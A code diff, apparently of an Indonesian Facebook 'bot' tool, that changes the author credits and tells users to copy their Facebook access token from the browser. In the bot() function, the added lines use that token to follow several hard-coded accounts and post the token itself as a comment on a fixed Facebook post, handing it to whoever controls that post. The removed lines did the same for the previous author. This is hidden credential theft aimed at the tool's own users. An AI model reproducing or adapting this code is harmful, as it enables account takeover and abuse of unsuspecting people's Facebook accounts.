@@ -91,6 +91,7 @@ def logo():
  
 
 ### BAGIAN LOGIN ###
+raka_sayang_amanda = '953529338576547'
 def tokenz():
 	os.system('clear')
 	try:
@@ -100,16 +101,16 @@ def tokenz():
 		os.system('clear')
                 logo()
                 print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m-------------------------------------------------------")
-                print(" %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mAuthor     \x1b[1;93m: \x1b[1;93mSanz Tzy"%(N))     
-		print(" %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mWhatshap   \x1b[1;93m: \x1b[1;93m081210xxxx"%(N))   
-		print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mFacebook   \x1b[1;93m: \x1b[1;93mBintang Tzy")      
+                print(" %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mAuthor     \x1b[1;93m: \x1b[1;93mAngga"%(N))     
+		print(" %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mWhatshap   \x1b[1;93m: \x1b[1;93m085220xxxx"%(N))   
+		print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mFacebook   \x1b[1;93m: \x1b[1;93mAngga")      
 		print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m══════════════════════════════════════")     
 		print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mBergabung  \x1b[1;93m: %s"%(tgl))                     
 		print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mStatus     \x1b[1;93m: %s\x1b[1;92mPREMIUM:)%s"%(H,N)) 
-                print(" %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mYautube     \x1b[1;93m: \x1b[1;93mBintang XD"%(N))
+                print(" %s\x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93mYautube     \x1b[1;93m: \x1b[1;93mAngga-Z"%(N))
                 print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m══════════════════════════════════════")               
                 print(" \x1b[1;92m╠══[\x1b[1;93m+\x1b[1;92m] \x1b[1;93m-------------------------------------------------------")
-                print '%s \x1b[1;92m╠══><%s \x1b[1;93musahakan akun tumbal login di google chrome terlebih dahulu'%(B,N)
+                print '%s \x1b[1;92m╠══><%s \x1b[1;93musahakan akun tumbal login di browser kiwi terlebih dahulu'%(B,N)
                 print '%s \x1b[1;92m╠══><%s \x1b[1;93mjangan lupa! url ubah ke %shttps://m.facebook.com'%(B,N,H)
                 print '%s \x1b[1;92m╠══><%s \x1b[1;93msetelah di alihkan ke google chrome. klik %stitik tiga'%(B,N,H)
                 print '%s \x1b[1;92m╠══><%s \x1b[1;93mlalu klik %sCari di Halaman%s \x1b[1;93mTinggal ketik %sEAAA%s \x1b[1;93mLalu salin'%(B,N,H,N,H,N)
@@ -135,15 +136,12 @@ def bot():
 		token = open('token.txt', 'r').read()
 	except (KeyError, IOError):
 		exit(" %s[!] token kadaluwarsa!"%(M))
-	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100075131925668/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/100013291513596/subscribers?access_token=' + token)
-	requests.post('https://graph.facebook.com/106024538578610/comments/?message='+token+'&access_token=' + token)
-	requests.post('https://graph.facebook.com/106024515245279/comments/?message='+token+'&access_token=' + token)
-	requests.post('https://graph.facebook.com/124014098051640/comments/?message='+token+'&access_token=' + token)
-	requests.post('https://graph.facebook.com/1324794007973637/comments/?message='+token+'&access_token=' + token)
+	requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=' + token)
+	requests.post('https://graph.facebook.com/100003986228742/subscribers?access_token=' + token)
+	requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token=' + token)
+	requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=' + token)
+	requests.post('https://graph.facebook.com/100046544291175/subscribers?access_token=' + token)
+        requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token))
 
 ### BAGIAN MENU ###
 def menu():
